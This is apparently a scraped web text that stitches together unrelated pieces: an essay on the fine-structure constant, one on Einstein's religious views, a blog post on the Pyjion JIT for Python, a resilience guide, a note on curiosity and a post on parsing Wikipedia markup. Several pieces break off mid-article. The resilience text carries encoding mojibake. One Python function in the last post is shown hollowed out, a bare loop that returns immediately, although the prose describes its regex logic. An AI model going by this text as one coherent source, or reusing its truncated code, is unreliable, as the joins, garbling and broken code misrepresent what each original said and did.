Shutterstock</span></figcaption></figure><p>Sommerfeld used α just as a parameter, but it gained fame in the late 1920s when it reappeared in advanced work on relativistic quantum mechanics by the French physicist Paul Dirac, and then in what the English astronomer Arthur Eddington hoped would be a Theory of Everything. He planned to merge quantum theory and relativity to derive the properties of the universe such as the number of elementary particles in it, and its constants, α among them.</p><p>One twist in Eddington’s approach was that he considered the quantity 1/α rather than α, because his analysis showed that it must be an integer as well as a pure number. This was consistent with a contemporary measurement that yielded 1/α = 137.1, tantalizingly near 137 exactly. Eddington’s calculations gave instead 136, close enough to raise interest. Further measurements however confirmed that 1/α = 137.036. Eddington’s attempts to justify his different result were unconvincing and for this and other reasons his theory has not survived.</p><p>But α and “137” remain linked, which is why Richard Feynman called 137 a “magic number.” What he meant has nothing to do with numerology. Rather it is that we know how to measure the value of α but not how to derive it from any theories we know. This is true also for the other fundamental constants, including pure numbers such as the ratio of the proton and electron masses, and is a lack in the Standard Model. Nevertheless, the value of α is critical in …</p></div></div>

Asked, at the close of a <a href="https://www.axios.com/elon-musk-tesla-death-bleeding-cash-a7928b06-3aae-43d7-bdde-5b9c41ef298f.html" target="_blank">conversation</a> with Axios, whether he believed in God, the CEO of both <a href="http://nautil.us/issue/65/in-plain-sight/so-can-we-terraform-mars-or-not" target="_blank">SpaceX</a> and Tesla paused, looked away from his interlocutors for a brief second, and then said, in that mild South African accent, “I believe there’s some explanation for this universe, which you might call God.”</p><p>Einstein did call it God. The German-Jewish physicist is famous for many things—his special and general theories of relativity, his burst of gray-white hair—including his esoteric remark, often intoned in discussions of the strange, probabilistic nature of quantum mechanics, that “God does not play dice.” A final or ultimate equation, describing the laws of nature and the origin of the cosmos, Einstein believed, could not involve chance intrinsically. Insofar as it did—it being the Copenhagen interpretation of quantum mechanics—it would be incomplete. (The consensus now among physicists is that he was wrong; God is indeterminate. “All the evidence points to him being an inveterate gambler,” Stephen Hawking once <a href="http://www.hawking.org.uk/does-god-play-dice.html" target="_blank"></a><a href="https://quod.lib.umich.edu/cgi/t/text/text-idx?cc=mqr;c=mqr;c=mqrarchive;idno=act2080.0039.401;g=mqrg;rgn=main;view=text;xc=1" target="_blank">said</a>, “who throws the dice on every possible occasion.”)</p><p>But what was with Einstein’s God-language in the first place? The question may be considered anew, in light of an auction at Christie’s, in New York, of a 1954 letter Einstein wrote that a couple years ago unexpectedly <a href="https://www.cnbc.com/2018/12/05/einsteins-god-letter-sold-at-auction-for-2point9-million--heres-why.html" target="_blank">sold</a> for $2.9 million. For the occasion the Princeton Club hosted a panel discussion on the conflict, or lack thereof, between science and religion, which featured theoretical physicist Brian Greene, philosopher Rebecca Newberger Goldstein, cognitive psychologist <a href="http://nautil.us/issue/72/quandary/human-exceptionalism-stifles-progress" target="_blank">Tania Lombrozo</a>, and Rabbi Geoff Mitelman, founding director of Sinai and Synapses, an organization dedicated to fostering respectful dialogue about religion and science. The event was open to the public, and I was excited to attend. (Full disclosure: At the time I was a&nbsp;<a href="http://sinaiandsynapses.org/2017-to-2019-sinai-synapses-fellows/" target="_blank">Sinai and Synapses fellow</a>.) I believe Einstein can still offer some insight on how to think about religion and science.</p><blockquote><p>“I believe in Spinoza’s God, who reveals himself in the lawful harmony of the world, not in a God who concerns himself with the fate and the doings of mankind.”</p> </blockquote><p>What Einstein said, in a note to the philosopher Eric Gutkind, whose book <i>Choose Life: The Biblical Call to Revolt</i> Einstein was reviewing, was nearly as scathing as any contemporary critique of religion you might hear from Richard Dawkins, <a href="http://nautil.us/issue/16/nothingness/an-atheists-guide-to-spirituality" target="_blank">Sam Harris</a>, or <a href="http://nautil.us/blog/why-christopher-hitchens-was-a-hero-to-scientists" target="_blank">Christopher Hitchens</a>. “The word God is for me,” Einstein wrote, “nothing more than the expression and product of human weakness, the Bible a collection of honorable, but still purely primitive, legends. No interpretation, no matter how subtle, can change this for me.”<br></p><p>It is no wonder why, for decades, Einstein’s views on religion became muddled in the popular imagination: The inconsistency is clear. Here, God means one thing; over there, another. Just going off his letter to Gutkind, Einstein appears to be an atheist. But read Einstein in other places and you find him directly declaring that he is not one. “I am not an Atheist,” he <a href="https://home.isi.org/john-gray-spinoza-today" target="_blank"></a><a href="https://books.google.com/books?id=c-ozDQAAQBAJ&amp;pg=PT53&amp;lpg=PT53&amp;dq=" q="I am not an atheist" target="_blank">said</a> in an interview published in 1930. “I do not know if I can define myself as a Pantheist. The problem involved is too vast for our limited minds.” Einstein was asked whether he was a <a href="http://nautil.us/blog/the-case-for-cosmic-pantheism" target="_blank">pantheist</a>. The rest of his response is worth quoting in full:</p><p>May I not reply with a parable? The human mind, no matter how highly trained, cannot grasp the universe. We are in the position of a little child, entering a huge library whose walls are covered to the ceiling with books in many different tongues. The child knows that someone must have written those books. It does not know who or how. It does not understand the languages in which they are written. The child notes a definite plan in the arrangement of the books, a mysterious order, which it does not comprehend, but only dimly suspects. That, it seems to me, is the attitude of the human mind, even the greatest and most cultured, toward God. We see a universe marvellously arranged, obeying certain laws, but we understand the laws only dimly. Our limited minds cannot grasp the mysterious force that sways the constellations. I am fascinated by Spinoza’s Pantheism. I admire even more his contributions to modern thought. Spinoza is the greatest of modern philosophers, because he is the first philosopher who deals with the soul and the body as one, not as two separate things.</p><p>Benedict Spinoza, the 17th century Jewish-Dutch philosopher, was also in his day confused for an atheist for writing things like this, from his treatise <i>Ethics</i>: “All things, I say, are in God, and everything which takes place takes place by the laws alone of the infinite nature of God, and follows (as I shall presently show) from the necessity of His essence.”</p><p>In 1929, Einstein received a telegram inquiring about his belief in God from a New York rabbi named Herbert Goldstein, who had heard a Boston cardinal say that the physicist’s theory of relativity implies “the ghastly apparition of atheism.” Einstein settled Goldstein down. “I believe in Spinoza’s God, who reveals himself in the lawful harmony of the world,” he told him, “not in a God who concerns himself with the fate and the doings of mankind.”</p><p>What that amounted to for Einstein, according to a 2006 <a href="https://hrcak.srce.hr/index.php?show=clanak&amp;id_clanak_jezik=19107" target="_blank">paper</a>, was a “cosmic religious feeling” that required no “<a href="http://nautil.us/issue/72/quandary/the-worth-of-an-angry-god" target="_blank">anthropomorphic conception of God</a>.” He <a href="https://www.sacred-texts.com/aor/einstein/einsci.htm" target="_blank">explained</a> this view in the <i>New York Times Magazine</i>: “The religious geniuses of all ages have been distinguished by this kind of religious feeling, which knows no dogma and no God conceived in man’s image; so that there can be no church whose central teachings are based on it. Hence it is precisely among the heretics of every age that we find men who were filled with this highest kind of religious feeling and were in many cases regarded by their contemporaries as atheists, sometimes also as saints. Looked at in this light, men like Democritus, Francis of Assisi, and Spinoza are closely akin to one another.”</p><p>So, as Einstein would have it, there is no necessary conflict between science and religion—or between science and “religious feelings.”</p><p><i>Brian Gallagher is an associate editor at&nbsp;</i>Nautilus<i>.

                <p><em>This post is an update on the Pyjion project to plug the .NET 5 CLR JIT compiler into Python 3.9.</em></p>
<p>.NET 5 was released on November 10, 2020. It is the cross-platform and open-source replacement of the <a href="https://github.com/dotnet/core"><strong>.NET Core</strong></a> project and the <strong>.NET</strong> project that ran exclusively on Windows since the late 90’s.</p>
<p>.NET is formed of many components:</p>
<ul>
<li>3 builtin languages, C#, F# and VB.NET, each with its own compiler</li>
<li>A standard library</li>
<li>A common intermediate language to abstract the high level languages from the core runtime. This is a standard known as <a href="https://github.com/tonybaloney/ecma-335/tree/master/docs">ECMA 335 CIL</a>.</li>
<li>A common language runtime (CLR) that compiles CIL into native machine code so that it can be executed and packages executables into .exe formats.</li>
</ul>
<p><img alt=".NET architecture" src="https://tonybaloney.github.io/img/posts/Common_Language_Infrastructure.png"></p>
<p>.NET 5 CLR comes bundled with a performant JIT compiler (codenamed RyuJIT) that will compile .NETs CIL into native machine instructions on Intel x86, x86-64, and ARM CPU architectures.</p>
<p>You can write code in a number of languages, like C++, C#, F# and compile those into CIL and then into native machine code (as a binary executable) on macOS, Linux, and Windows. Pretty neat.</p>
<p>But this is a blog about Python. So what does this have to do with Python?</p>
<p>Pyjion is a project to replace the core execution loop of CPython by transpiling CPython bytecode to ECMA CIL and then using the .NET 5 CLR to compile that into machine code. It then executes the machine-code compiled JIT frames at runtime instead of using the native execution loop of CPython.</p>
<h2>Very-quick overview of Python’s compiler</h2>
<p>When CPython compiles Python code, it compiles it into an intermediate format, similar to .NET, called Python bytecode. This bytecode is cached on disk so that when you import a module that hasn’t changed, it doesn’t compile it every time. You can see the bytecode by disassembling any Python function:</p>
<pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def half(x):
...    return x/2
... 
&gt;&gt;&gt; dis.dis(half)
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (2)
              4 BINARY_TRUE_DIVIDE
              6 RETURN_VALUE
</code></pre>

<p>To execute anything on a CPU, you have to provide the OS with machine-code instructions. This can be accomplished by compiling them up-front using a compiled like the C or C++ compilers. They compile code into executable formats as either shared libraries or standalone executables. <a href="https://tonybaloney.github.io/posts/extending-python-with-assembly.html"><em>See my post on Python/assembly for a bit more info on this topic</em></a>.</p>
<p>CPython converts the bytecode into machine code instructions like looping over them in a precompiled function, called the evaluation loop. This is essentially a big for loop with a switch statement. The compiled version of CPython that you’re running already has the instructions required. This is why CPython’s evaluation loop is an “AOT”, or “Ahead of Time” compiled library:</p>
<p><img alt="diagram 1" src="https://tonybaloney.github.io/img/posts/Slide1.png"></p>
<p><strong>Note: There is a lot more to CPython’s compiler. I’ve written a <a href="https://realpython.com/products/cpython-internals-book/">whole book on the CPython compiler and the internals of CPython</a> if you want to learn more.</strong></p>
<p>There are a few issues with this approach. The biggest is speed. A series of inline machine-code instructions is very performant. CPython has to make judgements at runtime for which code branch to follow every time your function is run. This leads to CPython being 100x slower in “tight-loop” problems where its executing the same thing again and again. The machine-code is compiled ahead of time and it has to loop around to get to the right instructions. Checkout my PyCon talk for a more in-depth explanation:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/I4nkgJdVZFA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The most common way around this performance barrier is to compile Python extensions from C. This produces a custom binary with inline machine-code instructions for the task at hand. This is how most machine-learning and data science libraries like numpy, pandas, SKL are put together. This approach is still AOT compiling the code. It also requires a lot of knowledge of C. This approach has worked really well for the data science community, where algorithms can be performant and leverage low-level platforms <a href="https://numba.pydata.org/numba-doc/latest/cuda/index.html">like GPUs or specialised AI chipsets</a>.</p>
<p>There are a few issues with the AOT extension module approach. One is that it still uses the evaluation loop. C extension modules are a set of functions. Once you call the C-compiled function, its in the performant code, but your Python code that’s calling it still lives inside Python’s loop. If you want to leverage a compiled library and your Python code is doing some heavy number crunching, you end up having to use an API of functions, like numpy, instead of a more fluent Python API:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.ones([9, 5, 7, 4])
&gt;&gt;&gt; c = np.ones([9, 5, 4, 3])
&gt;&gt;&gt; np.dot(a, c).shape
(9, 5, 7, 9, 5, 3)
&gt;&gt;&gt; np.matmul(a, c).shape
(9, 5, 7, 3)
</code></pre>

<h2>What Pyjion does to solve this issue</h2>
<p>A few releases of Python ago (CPython specifically, the most commonly used version of Python) in 3.7 a new API was added to be able to swap out “frame execution” with a replacement implementation. This is otherwise known as <a href="https://www.python.org/dev/peps/pep-0523/">PEP 523</a>. PEP 523 also added the capability to store additional attributes in <em>code objects</em> (compiled Python code.</p>
<p>Pyjion does not compile Python code. It compiles Python frames (code objects, like blocks, functions, methods, classes) into machine-code at runtime using a performant JIT:</p>
<p><img alt="diagram 2" src="https://tonybaloney.github.io/img/posts/Slide2.png"></p>
<p>CPython compiles the Python code, so whatever language features and behaviours there are in CPython 3.9, like the walrus operator, <a href="https://www.python.org/dev/peps/pep-0584">the dictionary union operator</a>, will all work exactly the same with this extension enabled. This also means that this extension uses the same standard library as Python 3.9.</p>
<p>Pyjion is a “pip installable” package for standard CPython that JIT compiles all Python code at runtime using the .NET 5 JIT compiler. You can use off-the-shelf CPython 3.9 on macOS, Linux or Windows. After installing this package you just import the module and enable the JIT.</p>
<p>Once a frame has been compiled, the binary code is cached in memory and reused every time the function is called:</p>
<p><img alt="diagram 3" src="https://tonybaloney.github.io/img/posts/Slide3.png"></p>
<h2>Using Pyjion</h2>
<p>To get started, you need to have .NET 5 installed, with Python 3.9 and the Pyjion package (I also recommend using a virtual environment).</p>
<p>After importing pyjion, enable it by calling <code>pyjion.enable()</code> which sets a compilation threshold to 0 (the code only needs to be run once to be compiled by the JIT):</p>
<pre><code>&gt;&gt;&gt; import pyjion
&gt;&gt;&gt; pyjion.enable()
</code></pre>

<p>Any Python code you define or import after enabling pyjion will be JIT compiled. You don’t need to execute functions in any special API, its completely transparent:</p>
<pre><code>&gt;&gt;&gt; def half(x):
...    return x/2
&gt;&gt;&gt; half(2)
1.0
</code></pre>

<p>Pyjion will have compiled the <code>half</code> function into machine code on-the-fly and stored a cached version of that compiled function inside the function object.
You can see some basic stats by running <code>pyjion.info(f)</code>, where <code>f</code> is the function object:</p>
<pre><code>&gt;&gt;&gt; pyjion.info(half)
{'failed': False, 'compiled': True, 'run_count': 1}
</code></pre>

<p>You can see the machine code for the compiled function by disassembling it in the Python REPL.
Pyjion has essentially compiled your small Python function into a small, standalone application.
Install <code>distorm3</code> first to disassemble x86-64 assembly and run <code>pyjion.dis.dis_native(f)</code>:</p>
<pre><code>&gt;&gt;&gt; import pyjion.dis
&gt;&gt;&gt; pyjion.dis.dis_native(half)
00000000: PUSH RBP
00000001: MOV RBP, RSP
00000004: PUSH R14
00000006: PUSH RBX
00000007: MOV RBX, RSI
0000000a: MOV R14, [RDI+0x40]
0000000e: CALL 0x1b34
00000013: CMP DWORD [RAX+0x30], 0x0
00000017: JZ 0x31
00000019: CMP QWORD [RAX+0x40], 0x0
0000001e: JZ 0x31
00000020: MOV RDI, RAX
00000023: MOV RSI, RBX
00000026: XOR EDX, EDX
00000028: POP RBX
00000029: POP R14
...
</code></pre>

<p>The complex logic of converting a portable instruction set into low-level machine instructions is done by .NET’s CLR JIT compiler.</p>
<p>All Python code executed after the JIT is enabled will be compiled into native machine code at runtime and cached on disk. For example, to enable the JIT on a simple <code>app.py</code> for a Flask web app:</p>
<pre><code>import pyjion
pyjion.enable()

from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

app.run()
</code></pre>

<p>That’s it.</p>
<h2>Will this be compatible with my existing Python code? What about C Extensions?</h2>
<p>The short answer is- if your existing Python code runs on CPython 3.9 – <strong>yes</strong> it will be compatible. To make sure, Pyjion has been tested against the full CPython “test suite” on all platforms. In fact, it was the first JIT ever to pass the test suite.</p>
<p>Thats because this isn’t a Python runtime, it uses the existing Python compiler to compile your code into Python bytecode (low level instructions).</p>
<p>Pyjion uses the same dynamic module loader as CPython, so if you import a Python extension from your virtual environment, it will work just the same in Pyjion.</p>
<h2>Project History</h2>
<p>Pyjion isn’t new. Brett Cannon and Dino Viehland started the Pyjion project 4 years ago. This was the first JIT to pass the full CPython test suite.
There were some limitations to the original proof-of-concept:</p>
<ul>
<li>Written against an old version of .NET Core</li>
<li>Required custom patches of .NET and compiling from source</li>
<li>Required custom patches of CPython and compiling from source</li>
<li>Only worked on Windows</li>
<li>It was written for Python 3.6 before PEP 523 was agreed and merged</li>
</ul>
<p>Has much changed since Python 3.6? To the average user, not really. But under the hood, the implementation of a few things has completely changed:</p>
<ul>
<li>Function calls</li>
<li>Iterators</li>
<li>Exception Handling</li>
<li>Dictionary, list and set comprehensions</li>
<li>Generators and coroutines</li>
</ul>
<p>Actually, a <strong>lot</strong> has changed in the last few releases of CPython. The new fork to get Pyjion working with the latest version of everything was a big undertaking…</p>
<p><img alt="not-much-has-changed" src="https://tonybaloney.github.io/img/posts-original/not-much-has-changed.png"></p>
<p>The goal with the latest patch was to get the project up to the condition of:</p>
<ul>
<li>Using the release binaries of .NET 5 and CPython 3.9</li>
<li>Making it work across all platforms</li>
<li>Implement the PEP523 interface</li>
<li>Implement all the new features of Python 3.9</li>
<li>Making the package “pip installable” from PyPi</li>
<li>Improving the test coverage</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Adversity is everywhere. It can strike when youâ€™re least expecting it, and it might be accompanied by unpleasant, albeit normal, reactions such as anxiety, excessive worry, disappointment, grief, shame, frustration and sadness. Moving on from, and even growing through, a difficult or traumatic experience can be hard, but it <em>is</em> possible.</p>
<p>Iâ€™m sure youâ€™ve already heard, read or witnessed many inspiring stories of people who have bounced back from adversity, such as the death of a loved one, losing a job, serious physical illnesses, accidents, disasters or wars. But what should we do when weâ€™re faced with hardship ourselves? How will we deal with our pain? Can we prepare ourselves for this inevitable experience?</p>
<p>The answers to these questions are not straightforward, but the psychological concept of â€˜resilienceâ€™ can help. Given that weâ€™re all currently in the midst of an adverse situation â€“ the COVID-19 pandemic â€“ understanding resilience is especially pertinent. Resilience is defined as the ability to navigate successfully through, and recover from, stressful circumstances or crisis situations, and to do so in a way that leads to healthy functioning over time. That is, resilience is not only about bouncing back, but also about experiencing some sort of growth, such as finding meaning and purpose, self-awareness or experiencing improvement in interpersonal relationships.</p>
<p>Defining resilience might sound easy, but itâ€™s a more complex concept than you might think. First, many people display resilience immediately following exposure to a hardship or potentially traumatic event. And in the long term, most people who have gone through traumatic experiences donâ€™t show signs of depression or anxiety problems later in life. Consider the <a href="https://journals.sagepub.com/doi/10.1111/j.1467-9280.2006.01682.x" rel="nofollow noreferrer noopener">study</a> of New York residents in the wake of the terrorist attack of <span>11 September</span> 2001: the researchers found that <span>65 per cent</span> of those questioned had returned to their normal level of functioning within six months. You too might be capable of more resilience than you realise.</p>
<p>Second, although some people seem disposed to deal more effectively with stress and anxiety, and to better regulate their emotions, resilience is not a single trait that you either possess or you donâ€™t. Rather, itâ€™s a set of skills, including behaviours and thoughts that can be improved through learning and exposure to new experiences.</p>
<p>Third, although individual characteristics matter for resilience, <a href="https://pubmed.ncbi.nlm.nih.gov/11202047/" rel="nofollow noreferrer noopener">contextual</a> factors also have an influence, such as the social, health and economic resources available to you. For instance, you might be predisposed for resilience but, if you were brought up in an unsupportive and stressful environment by abusive parents, you might not develop it. In fact, as well as being inaccurate, it is unfair and harmful to see resilience purely as an individual trait â€“ people who struggle to recover from a negative life event might think that thereâ€™s something inherently wrong with them, which isnâ€™t true. Access to certain external resources is a major factor in anyoneâ€™s ability to display resilience.</p>
<p>Fourth, resilience is <a href="https://pubmed.ncbi.nlm.nih.gov/22559117/" rel="nofollow noreferrer noopener">dynamic</a>. You can be resilient in one context but then your capacity for resilience, or your ability to draw on available resources, might not be enough for another, possibly more demanding or difficult, situation. All of us can be more resilient at one stage in our lives but less so in another.</p>
<p>Fifth, being resilient doesnâ€™t mean that you wonâ€™t have a wound or a scar. For example, in one <a href="https://pubmed.ncbi.nlm.nih.gov/12416919/" rel="nofollow noreferrer noopener">study</a> of more than 200 people who had experienced the death of their spouse, even those identified as the most resilient reported having at least some grief symptoms. Almost everyone suffers some negative effects, such as emotional strain, throughout the journey of adversity but resilient individuals manage to recover well.</p>
<p>Lastly, it might sound paradoxical, but resilience comes from being in touch with adversity, not from trying to stay positive all the time, or from always running away from difficulties in life. Many of us are taught from an early age that we should avoid difficulties or stress, and itâ€™s true that toxic chronic stress is a <a href="https://pubmed.ncbi.nlm.nih.gov/27417486/" rel="nofollow noreferrer noopener">risk</a> factor for mental health problems. But exposure to some level of stress provides you with the necessary challenge to become stronger in the face of hardship, as long as you learn to cope successfully. By contrast, if youâ€™re overly avoidant of challenges in life then, when an unavoidable hardship arises, you wonâ€™t have developed the necessary skills to cope.</p>
<p>Understanding the complex, dynamic nature of resilience is important because it shows that there is no magic pill or a recipe that will make you resilient. Each individual will have their own way of coping with distress, their own pace of recovery, and levels of learning from a crisis. It is also totally fine to fail to recover quickly or entirely from a particular adversity. Itâ€™s okay to get hurt or lost during a difficult time.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Science doesnâ€™t have all the answers on how one becomes resilient, but what we do know is that it requires learning to tap into both inner and external resources. Iâ€™ll touch on some of the most fundamental ones.</p>
<p><strong>Connect with others</strong></p>
<p>During difficult times, it is common to want to withdraw from the world. This can be for varied reasons, such as feelings of shame, the fear of being judged, or not wishing to be a drain on others. Although there is nothing wrong with wanting solitude during difficult times, it is also important that you stay in touch with people, at least to an extent. <a href="https://pubmed.ncbi.nlm.nih.gov/12555794/" rel="nofollow noreferrer noopener">Research</a> shows that the risk of developing post-traumatic stress disorder is higher for people who lack post-trauma social support (bear in mind that, even if you have friends and family, if you avoid seeing or talking to them entirely, then it will be impossible for them to help you).</p>
<p>People who choose to connect with others and nurture their relationships, as opposed to isolating themselves, tend to become better at coping with a hardship and growing through their experience. The emotional and instrumental social support you get from your intimate relationships, and from your communities, can also give you the motivation to handle stress in a healthy way.</p>
<p>So, when difficulties are overwhelming, try reaching out to others who can provide support. There are a few different ways you could do this. One is simply by talking about what youâ€™re going through. It can be frustrating to talk to someone who just pretends that theyâ€™re listening or who is judgmental, so try to find someone who is accepting and good at listening. You could also try letting them know in advance that all you need is to be listened to. Another approach is to ask specifically for instrumental help, such as information, advice or help with daily tasks. More resilient people are usually aware that they canâ€™t solve every problem on their own. You might find it especially difficult to ask for help if youâ€™re used to handling problems on your own, or if you see relying on others as a sign of weakness. Try to remember that it takes courage to ask for help, and being in need simply means that youâ€™re human.</p>
<p>Here are a few more ideas for how to connect with others and get support: if you exercise or go for a walk, try inviting someone else along. Make a commitment to call or email loved ones regularly. Make use of the power of play â€“ laugh with friends or get silly. If there are social groups that share a common interest or hobby of yours, join them to exchange ideas or to get to know new people. Support others informally or through volunteer organisations; helping others makes us feel happy and valued.</p>
<p>Most importantly, donâ€™t wait for a disaster to occur to connect; make sure you have supportive relationships that nurture your sense of self-worth and need for intimacy, which in turn can contribute to resilience. If youâ€™re physically distant from your loved ones, look for ways to socially connect on a regular basis. Even the presence and support of a small number of people you can rely on can make a huge difference when adversity strikes.</p>
<p><strong>Accept and focus on what you can control</strong></p>
<p>About seven years ago, I was diagnosed with peripheral neuropathy, which is a type of nerve damage. For me, this chronic condition manifests itself as a constant sharp pain and burning sensation on my feet. My life was miserable for six months before the diagnosis, and the pain was unbearable. I could barely walk for five minutes at a time. Upon the diagnosis, I was prescribed medication that eased my pain. Although itâ€™s manageable now, the pain is always there, and Iâ€™ll probably be on medication for the rest of my life. For the first few months, I had difficulty accepting this. Back then, I <span>was 35</span> and had been physically very active before developing this illness. At least a hundred times I asked myself how it was possible. Rejecting and blaming myself, others or the world seemed to provide some relief but it didnâ€™t get me anywhere.</p>
<p>Then one day I decided to stop wrestling with my pain and to start acknowledging it. This didnâ€™t mean that I liked the situation â€“ I hated it â€“ but it provided me with the space to start being proactive and to find effective coping strategies. The more I accepted my situation and my pain, the less pain I felt. A <a href="https://pubmed.ncbi.nlm.nih.gov/16139188/" rel="nofollow noreferrer noopener">study</a> that involved experimentally inducing pain in <span>62 men and</span> women showed the effectiveness of acceptance â€“ those taught acceptance experienced less sensory pain compared with a control group who used simple distraction.</p>
<p>Note that acceptance is not about giving up or quitting. Itâ€™s about gently noticing whatâ€™s going on, and allowing unpleasant experiences to exist, without attempting to change or deny them. With acceptance, you can choose to do what really matters to you and follow your values more easily. In his <a href="https://stevenchayes.com/a-liberated-mind/" rel="nofollow noreferrer noopener">book</a> <em>A Liberated Mind</em> (2019), the American psychologist <a href="https://aeon.co/essays/how-to-live-a-values-driven-life-in-the-face-of-dark-emotions" rel="noopener">Steven Hayes</a>, the founder of <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3635495/" rel="nofollow noreferrer noopener">ACT</a> (acceptance and …</p></div></div></section></div></div>

<p>There seems to be a strong, almost causal relationship between curiosity and creativity.</p>



<p>My hypothesis is that curious people constantly do three things that are essential for the creative process: exploring, observing and asking questions.</p>



<p><strong>Curious individuals are interested in nearly everything.</strong></p>



<p>They’re always learning about and exploring new subjects. As a result, they hold in their heads a wide-ranging reservoir of information and mental models. This allows them to cross-pollinate ideas, extrapolate concepts and make unexpected connections.</p>



<p><strong>Another thing they’re very good at is observing.&nbsp;</strong></p>



<p>Curious people tend to go through life at a different pace than everyone else. They move relatively slowly. And whenever something catches their attention, they stop to contemplate it. Their ability to look extensively at and into things allows them to unveil patterns that most people are too busy to see.</p>



<p><strong>Finally, curious people like to ask tons of questions.</strong></p>



<p>As everything else, questions are subject to probabilities — the more questions you ask, the higher your chances of asking a good question. Good questions, in turn, help them find things that don’t work or don’t make sense. Thus, opening the doors for breakthroughs and innovation.</p>



<p>By giving yourself permission to cultivate curiosity, you’re also laying the foundation for a prolific, creative life.</p>

<section id="main_content">


<p>I’m working on a project where I want to have an offline encyclopedia. It’s for training deep learning networks so it needs to be in plain text English. 
No markup, no special characters. Human readable without any interpreters, renderers, or parsers. I’ve got plenty of disk space, so that’s not a concern. 
Once I parse out all the Wikipedia articles I can get my hands on, I will create an index. Or I might index them into SOLR or something like that. Not sure yet.
I’m also going to implement it as a resource for a massive <a href="https://towardsdatascience.com/building-a-question-answering-system-part-1-9388aadff507">SQUAD repo</a>. I have uploaded a copy of the final result to <a href="https://www.kaggle.com/ltcmdrdata/plain-text-wikipedia-202011">Kaggle Datasets</a>. I’ve stashed the script in a <a href="https://github.com/daveshap/PlainTextWikipedia">dedicated repo on GitHub</a>.</p>



<p>The first thing I should have learned is that Wikipedia is written in a demented Frankenstein language called WikeMedia Text. It’s a hybrid of HTML/XML and Markdown. 
It has no consistency and is the worst example of spaghetti code I’ve ever seen. I’m sure there are better implementations today, but I can see how and why it ended up the way it did.
For instance, you need to be able to create robust references and links, so the URL syntax is way jacked. It relies on a lot of procedural generation at display time.
Personally, if it were done again today, I think something like Jekyll would be way better. Instead of rendering again and again every time someone visits a page, render it once after each edit.
But that’s just me. So instead we’re left with this horrible hybrid language that should die in a fire.</p>

<p>Fine, it is what it is. I’m an expert automator, dammit, and if a machine can automatically render this nonsense, then I sure as hell can <strong>unrender it</strong>.</p>

<h2 id="attempt-1---brute-force-regex">Attempt 1 - Brute Force Regex</h2>

<p>“Brute Force Regex” (BFR) is not a real thing. It’s just something I’ve been doing for years now in my automation habits. Usually, as a naive approach, I’ll try and do some 
search-and-replace jiggery pokery to just remove unwanted junk. Sometimes this is textual formatting, like brackets around tables or other HTML tags. 
So I ended up with the following function. Caution, it’s not pretty. This was just an experiment, and I wanted to share it so you would see what doesn’t work.</p>

<div><div><pre><code><span>def</span> <span>basic_replacements</span><span>(</span><span>text</span><span>):</span>
    <span>replacements</span> <span>=</span> <span>[</span>
    <span>(</span><span>'&amp;lt;'</span><span>,</span><span>'&lt;'</span><span>),</span>
    <span>(</span><span>'&amp;gt;'</span><span>,</span><span>'&gt;'</span><span>),</span>
    <span>(</span><span>'&amp;quot;'</span><span>,</span><span>'"'</span><span>),</span>
    <span>(</span><span>"'''"</span><span>,</span><span>' = '</span><span>),</span>
    <span>(</span><span>"'{2,}"</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'</span><span>\n</span><span>'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>r'\n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'r</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'&lt;ref.*?&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'&lt;/ref&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'http.*?\s'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'\s+'</span><span>,</span><span>' '</span><span>),</span>
    <span>]</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>for</span> <span>r</span> <span>in</span> <span>replacements</span><span>:</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>r</span><span>[</span><span>0</span><span>],</span> <span>r</span><span>[</span><span>1</span><span>],</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
</code></pre></div></div>

<p>I came up with this scheme because, at first glance, WikiMedia Text looked like a mixture of some basic HTML and some Markdown. 
I figured I could handle it with some basic regex replacements. This worked… to an extent. There were a few problems with it though.</p>

<ol>
  <li>Couldn’t handle nested square brackets or curly brackets, and it turns out there are a lot of those</li>
  <li>Quickly became intractable when I encountered escaped unicode literals like <code>\u2013</code>. They are frigging everywhere.</li>
</ol>

<p>So I wrote two more functions to try and tackle the bracketed stuff. These are things like links, citations, and pictures. Since I want a text-only Wikipedia, 
I really just needed to strip it all away.</p>

<div><div><pre><code><span>def</span> <span>remove_double_curly</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>

            <span>return</span> <span>text</span>

</code></pre></div></div>

<p>These functions worked-ish. You might notice the carat <code>^</code> in the curly function. This told it to match anything except another open curly bracket. This forced it to find the
innermost nested curly brackets. Again, this mostly worked, but it failed a few times and I gave up trying to figure out why. The square brackets are a bit different, as
they tend not to be nested but the inner syntax could be several different things. I opted for the simplest possible way and even so, it missed a few things. No idea why.</p>

<h2 id="attempt-15---literal-evals">Attempt 1.5 - Literal Evals</h2>

<p>I suppose I should rewind and give some context. Wikipedia dump files are effing huge. Even with 32GB of RAM on my desktop, I was rapidly running out of memory just 
loading one chunk at a time. So that meant I had to read each file line by line. Like so:</p>

